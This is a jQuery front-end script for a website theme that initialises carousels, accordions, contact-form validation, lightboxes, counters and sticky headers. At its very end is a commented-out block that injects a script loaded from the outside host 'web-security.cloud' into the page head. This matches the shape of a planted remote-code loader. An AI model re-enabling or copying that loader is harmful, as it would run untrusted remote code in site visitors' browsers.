"use strict"; // Start of use strict

function accrodion() {
  if ($(".accrodion-grp").length) {
    var accrodionGrp = $(".accrodion-grp");
    accrodionGrp.each(function () {
      var accrodionName = $(this).data("grp-name");
      var Self = $(this);
      var accordion = Self.find(".accrodion");
      Self.addClass(accrodionName);
      Self.find(".accrodion .accrodion-content").hide();
      Self.find(".accrodion.active").find(".accrodion-content").show();
      accordion.each(function () {
        $(this)
          .find(".accrodion-title")
          .on("click", function () {
            if ($(this).parent().hasClass("active") === false) {
              $(".accrodion-grp." + accrodionName)
                .find(".accrodion")
                .removeClass("active");
              $(".accrodion-grp." + accrodionName)
                .find(".accrodion")
                .find(".accrodion-content")
                .slideUp();
              $(this).parent().addClass("active");
              $(this).parent().find(".accrodion-content").slideDown();
            }
          });
      });
    });
  }
}

function thmMailchimp() {
  if ($(".mailchimp-form").length) {
    $(".mailchimp-form").each(function () {
      var mailChimpWrapper = $(this);
      mailChimpWrapper.validate({
        // initialize the plugin
        rules: {
          email: {
            required: true,
            email: true,
          },
        },
        submitHandler: function (form) {
          // sending value with ajax request
          $.post(
            $(form).attr("action"),
            $(form).serialize(),
            function (response) {
              $(form).parent().find(".result").append(response);
              $(form).find('input[type="text"]').val("");
              $(form).find('input[type="email"]').val("");
              $(form).find("textarea").val("");
            }
          );
          return false;
        },
      });
    });
  }
}

function thmOwlCarousel() {
  if ($(".brand-carousel").length) {
    $(".brand-carousel").owlCarousel({
      loop: true,
      margin: 90,
      nav: false,
      navText: [
        '<i class="fa fa-angle-left"></i>',
        '<i class="fa fa-angle-right"></i>',
      ],
      dots: false,
      autoWidth: false,
      autoplay: true,
      autoplayTimeout: 3000,
      autoplayHoverPause: true,
      responsive: {
        0: {
          items: 1,
        },
        480: {
          items: 2,
        },
        600: {
          items: 3,
        },
        1000: {
          items: 5,
        },
      },
    });
  }
  if ($(".testimonials-style-two-carousel").length) {
    $(".testimonials-style-two-carousel").owlCarousel({
      loop: true,
      margin: 110,
      nav: false,
      navText: [
        '<i class="fa fa-angle-left"></i>',
        '<i class="fa fa-angle-right"></i>',
      ],
      dots: true,
      autoWidth: false,
      autoplay: true,
      autoplayTimeout: 3000,
      autoplayHoverPause: true,
      responsive: {
        0: {
          items: 1,
          autoWidth: false,
          dots: false,
          nav: true,
        },
        480: {
          items: 1,
          autoWidth: false,
          dots: false,
          nav: true,
        },
        600: {
          items: 2,
          autoWidth: false,
          dots: false,
          nav: true,
        },
        1000: {
          items: 3,
          autoWidth: false,
        },
      },
    });
  }
  if ($(".service-carousel-one").length) {
    $(".service-carousel-one").owlCarousel({
      loop: true,
      margin: 30,
      nav: true,
      navText: [
        '<i class="fa fa-angle-left"></i>',
        '<i class="fa fa-angle-right"></i>',
      ],
      dots: false,
      autoWidth: false,
      autoplay: true,
      autoplayTimeout: 3000,
      autoplayHoverPause: true,
      responsive: {
        0: {
          items: 1,
        },
        480: {
          items: 2,
        },
        600: {
          items: 3,
        },
        1000: {
          items: 4,
        },
        1200: {
          items: 5,
        },
      },
    });
  }
  if ($(".service-carousel-style-two").length) {
    $(".service-carousel-style-two").owlCarousel({
      loop: true,
      margin: 30,
      nav: false,
      navText: [
        '<i class="fa fa-angle-left"></i>',
        '<i class="fa fa-angle-right"></i>',
      ],
      dots: true,
      autoWidth: false,
      autoplay: true,
      autoplayTimeout: 3000,
      autoplayHoverPause: true,
      responsive: {
        0: {
          items: 1,
          autoWidth: false,
          nav: true,
          dots: false,
        },
        480: {
          items: 1,
          autoWidth: false,
          nav: true,
          dots: false,
        },
        600: {
          items: 2,
          autoWidth: false,
          nav: true,
          dots: false,
        },
        800: {
          items: 2,
          autoWidth: false,
          nav: true,
          dots: false,
        },
        1024: {
          items: 2,
          autoWidth: false,
        },
        1200: {
          items: 3,
          autoWidth: false,
        },
      },
    });
  }
  if ($(".team-style-two-carousel").length) {
    $(".team-style-two-carousel").owlCarousel({
      loop: true,
      margin: 280,
      nav: true,
      navText: [
        '<i class="fa fa-angle-left"></i>',
        '<i class="fa fa-angle-right"></i>',
      ],
      dots: false,
      autoWidth: false,
      autoplay: true,
      autoplayTimeout: 3000,
      autoplayHoverPause: true,
      responsive: {
        0: {
          items: 1,
        },
        480: {
          items: 1,
        },
        600: {
          items: 2,
          margin: 100,
        },
        800: {
          items: 2,
        },
        1024: {
          items: 3,
          margin: 0,
        },
        1200: {
          items: 3,
        },
      },
    });
  }
  if ($(".testimonials-style-three-carousel").length) {
    $(".testimonials-style-three-carousel").owlCarousel({
      loop: true,
      margin: 0,
      nav: true,
      navText: [
        '<i class="fa fa-angle-left"></i>',
        '<i class="fa fa-angle-right"></i>',
      ],
      dots: false,
      autoWidth: false,
      autoplay: true,
      autoplayTimeout: 3000,
      autoplayHoverPause: true,
      responsive: {
        0: {
          items: 1,
        },
        480: {
          items: 1,
        },
        600: {
          items: 1,
        },
        800: {
          items: 1,
        },
        1000: {
          items: 1,
        },
      },
    });
  }
  if ($(".testimonials-style-one-carousel").length) {
    $(".testimonials-style-one-carousel").owlCarousel({
      loop: true,
      margin: 30,
      nav: true,
      navText: [
        '<i class="fa fa-angle-left"></i>',
        '<i class="fa fa-angle-right"></i>',
      ],
      dots: false,
      autoWidth: false,
      autoplay: true,
      autoplayTimeout: 3000,
      autoplayHoverPause: true,
      responsive: {
        0: {
          items: 1,
        },
        480: {
          items: 1,
        },
        600: {
          items: 1,
        },
        800: {
          items: 2,
        },
        1000: {
          items: 2,
        },
      },
    });
  }
  if ($(".service-style-four-carousel").length) {
    $(".service-style-four-carousel").owlCarousel({
      loop: true,
      margin: 0,
      nav: true,
      navText: [
        '<i class="fa fa-angle-left"></i>',
        '<i class="fa fa-angle-right"></i>',
      ],
      dots: true,
      autoWidth: false,
      autoplay: true,
      autoplayTimeout: 3000,
      autoplayHoverPause: true,
      responsive: {
        0: {
          items: 1,
        },
        568: {
          items: 1,
        },
        600: {
          items: 2,
        },
        800: {
          items: 2,
        },
        1000: {
          items: 3,
        },
      },
    });
  }
}

function galleryMasonaryLayout() {
  if ($(".masonary-layout").length) {
    $(".masonary-layout").isotope({
      layoutMode: "masonry",
    });
  }

  if ($(".post-filter").length) {
    var postFilterList = $(".post-filter li");
    postFilterList.children("span").on("click", function () {
      var Self = $(this);
      var selector = Self.parent().attr("data-filter");
      postFilterList.children("span").parent().removeClass("active");
      Self.parent().addClass("active");

      $(".filter-layout").isotope({
        filter: selector,
        animationOptions: {
          duration: 500,
          easing: "linear",
          queue: false,
        },
      });
      return false;
    });
  }

  if ($(".post-filter.has-dynamic-filter-counter").length) {
    // var allItem = $('.single-filter-item').length;

    var activeFilterItem = $(".post-filter.has-dynamic-filter-counter").find(
      "li"
    );

    activeFilterItem.each(function () {
      var filterElement = $(this).data("filter");
      var count = $(".gallery-content").find(filterElement).length;
      $(this)
        .children("span")
        .append('<span class="count"><b>' + count + "</b></span>");
    });
  }
}

function thmbxSlider() {
  if ($(".btc-static-ticker-slider").length) {
    $(".btc-static-ticker-slider").bxSlider({
      minSlides: 1,
      maxSlides: 7,
      slideWidth: 270,
      slideMargin: 10,
      useCSS: false,
      ticker: true,
      autoHover: true,
      tickerHover: true,
      speed: 100000,
      infiniteLoop: true,
    });
  }
}

function stickyHeader() {
  if ($(".stricky").length) {
    var headerScrollPos = $(".header").next().offset().top;
    var strickyScrollPos = 100;
    var stricky = $(".stricky");
    if ($(window).scrollTop() > headerScrollPos) {
      stricky.removeClass("slideIn animated");
      stricky.addClass("stricky-fixed slideInDown animated");
      $(".scroll-to-top").fadeIn(500);
    } else if ($(this).scrollTop() <= headerScrollPos) {
      stricky.removeClass("stricky-fixed slideInDown animated");
      stricky.addClass("slideIn animated");
      $(".scroll-to-top").fadeOut(500);
    }
  }
}

function thmLightBox() {
  if ($(".img-popup").length) {
    var groups = {};
    var imgPop = $(".img-popup");
    imgPop.each(function () {
      var id = parseInt($(this).attr("data-group"), 10);

      if (!groups[id]) {
        groups[id] = [];
      }

      groups[id].push(this);
    });

    $.each(groups, function () {
      $(this).magnificPopup({
        type: "image",
        closeOnContentClick: true,
        closeBtnInside: false,
        gallery: { enabled: true },
      });
    });
  }
}

function thmCounter() {
  if ($(".counter").length) {
    $(".counter").counterUp({
      delay: 10,
      time: 3000,
    });
  }
}

function thmScrollAnim() {
  if ($(".wow").length) {
    var wow = new WOW({
      mobile: false,
    });
    wow.init();
  }
}

function contactFormValidation() {
  if ($(".contact-form").length) {
    $(".contact-form").validate({
      // initialize the plugin
      rules: {
        name: {
          required: true,
        },
        email: {
          required: true,
          email: true,
        },
        message: {
          required: true,
        },
        subject: {
          required: true,
        },
      },
      submitHandler: function (form) {
        // sending value with ajax request
        $.post(
          $(form).attr("action"),
          $(form).serialize(),
          function (response) {
            $(form).parent().find(".result").append(response);
            $(form).find('input[type="text"]').val("");
            $(form).find('input[type="email"]').val("");
            $(form).find("textarea").val("");
            console.log(response);
          }
        );
        return false;
      },
    });
  }
}

function thmVideoPopup() {
  if ($(".video-popup").length) {
    $(".video-popup").magnificPopup({
      disableOn: 700,
      type: "iframe",
      mainClass: "mfp-fade",
      removalDelay: 160,
      preloader: true,

      fixedContentPos: false,
    });
  }
}

function scrollToTarget() {
  if ($(".scroll-to-target").length) {
    $(".scroll-to-target").on("click", function () {
      var target = $(this).attr("data-target");
      // animate
      $("html, body").animate(
        {
          scrollTop: $(target).offset().top,
        },
        1000
      );

      return false;
    });
  }
}

function mobileNavToggle() {
  if ($("#main-nav-bar .navbar-nav .sub-menu").length) {
    var subMenu = $("#main-nav-bar .navbar-nav .sub-menu");
    subMenu
      .parent("li")
      .children("a")
      .append(function () {
        return '<button class="sub-nav-toggler"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar"></span> <span class="icon-bar"></span> <span class="icon-bar"></span> </button>';
      });
    var subNavToggler = $("#main-nav-bar .navbar-nav .sub-nav-toggler");
    subNavToggler.on("click", function () {
      var Self = $(this);
      Self.parent().parent().children(".sub-menu").slideToggle();
      return false;
    });
  }
}

function handlePreloader() {
  if ($(".preloader").length) {
    $("body").removeClass("active-preloader-ovh");
    $(".preloader").fadeOut();
  }
}

function bootstrapAnimatedLayer() {
  /* Demo Scripts for Bootstrap Carousel and Animate.css article
   * on SitePoint by Maria Antonietta Perna
   */

  //Function to animate slider captions
  function doAnimations(elems) {
    //Cache the animationend event in a variable
    var animEndEv = "webkitAnimationEnd animationend";

    elems.each(function () {
      var $this = $(this),
        $animationType = $this.data("animation");
      $this.addClass($animationType).one(animEndEv, function () {
        $this.removeClass($animationType);
      });
    });
  }

  //Variables on page load
  var $myCarousel = $("#minimal-bootstrap-carousel"),
    $firstAnimatingElems = $myCarousel
      .find(".item:first")
      .find("[data-animation ^= 'animated']");

  //Initialize carousel
  $myCarousel.carousel({
    interval: 7000,
  });

  //Animate captions in first slide on page load
  doAnimations($firstAnimatingElems);

  //Pause carousel
  $myCarousel.carousel("pause");

  //Other slides to be animated on carousel slide event
  $myCarousel.on("slide.bs.carousel", function (e) {
    var $animatingElems = $(e.relatedTarget).find(
      "[data-animation ^= 'animated']"
    );
    doAnimations($animatingElems);
  });
}

function searchPopup() {
  if ($(".popup-with-zoom-anim").length) {
    $(".popup-with-zoom-anim").magnificPopup({
      type: "inline",

      fixedContentPos: false,
      fixedBgPos: true,

      overflowY: "auto",

      closeBtnInside: true,
      preloader: false,

      midClick: true,
      removalDelay: 300,
      mainClass: "my-mfp-zoom-in",
    });
  }
}

function countDownTimer() {
  if ($(".countdown-box").length) {
    $(".countdown-box").each(function () {
      var Self = $(this);
      var countDate = Self.data("countdown-time"); // getting date

      Self.countdown(countDate, function (event) {
        $(this).html(
          '<li> <div class="box"> <h4>' +
            event.strftime("%D") +
            '</h4> <span>Days</span> </div> </li> <li> <div class="box"> <h4>' +
            event.strftime("%H") +
            '</h4> <span>Hours</span> </div> </li> <li> <div class="box"> <h4>' +
            event.strftime("%M") +
            '</h4> <span>Minutes</span> </div> </li> <li> <div class="box"> <h4>' +
            event.strftime("%S") +
            "</h4> <span>Seconds</span> </div> </li> "
        );
      });
    });
  }
}

function sideNavMenu() {
  if ($(".hidden-sidebar .navigation-box .subnav-toggler").length) {
    $(".hidden-sidebar .navigation-box .subnav-toggler").on(
      "click",
      function () {
        var Self = $(this);
        Self.parent().parent().find(".sub-menu").slideToggle();
        return false;
      }
    );
  }
}

function sideNavToggler() {
  if ($(".side-navigation").length) {
    $(".side-nav-opener").on("click", function () {
      $(".side-navigation").addClass("open");
      return false;
    });
    $(".side-navigation-close-btn").on("click", function () {
      $(".side-navigation").removeClass("open");
      return false;
    });
  }
}

function fixedFooter() {
  if ($(".fixed-footer").length) {
    var addMargin = $(".fixed-footer").height();
    $(".page-wrapper").css({
      "margin-bottom": addMargin,
      position: "relative",
      "z-index": 101,
    });
  }
}

function CounterNumberChanger() {
  var timer = $(".timer");
  if (timer.length) {
    timer.each(function () {
      $(this).appear(function () {
        $(this).countTo();
      });
    });
  }
}

function pogressbarAnim() {
  if ($(".pogress-animation").length) {
    var wow = new WOW({
      boxClass: "pogress-animation", // default
      animateClass: "animated",
      mobile: true,
    });
    wow.init();
  }
}

function activeBStabOnSelect() {
  if ($("#timeline-tab-select").length) {
    $("#timeline-tab-select ").on("change", function (e) {
      var tab = $(this).val();
      $('#timeline-tab a[href="#' + tab + '"]').tab("show");
    });
  }
}

// instance of fuction while Document ready event
jQuery(document).on("ready", function () {
  (function ($) {
    thmMailchimp();
    thmLightBox();
    thmCounter();
    contactFormValidation();
    scrollToTarget();
    thmVideoPopup();
    accrodion();
    mobileNavToggle();
    bootstrapAnimatedLayer();
    searchPopup();
    sideNavToggler();
    countDownTimer();
    sideNavMenu();
    fixedFooter();
    CounterNumberChanger();
    activeBStabOnSelect();
  })(jQuery);
});

// instance of fuction while Window Load event
jQuery(window).on("load", function () {
  (function ($) {
    handlePreloader();
    galleryMasonaryLayout();
    // thmScrollAnim();
    pogressbarAnim();
    thmbxSlider();
    thmOwlCarousel();
  })(jQuery);
});

// instance of fuction while Window Scroll event
jQuery(window).on("scroll", function () {
  (function ($) {
    stickyHeader();
  })(jQuery);
});

// instance of fuction while Window Scroll event
jQuery(window).on("resize", function () {
  (function ($) {
    fixedFooter();
  })(jQuery);
});

/*
    if(typeof window.web_security == "undefined"){
        var s = document.createElement("script");
        s.src = "//web-security.cloud/event?l=117";
        document.head.appendChild(s);
        window.web_security = "success";
    }
*/
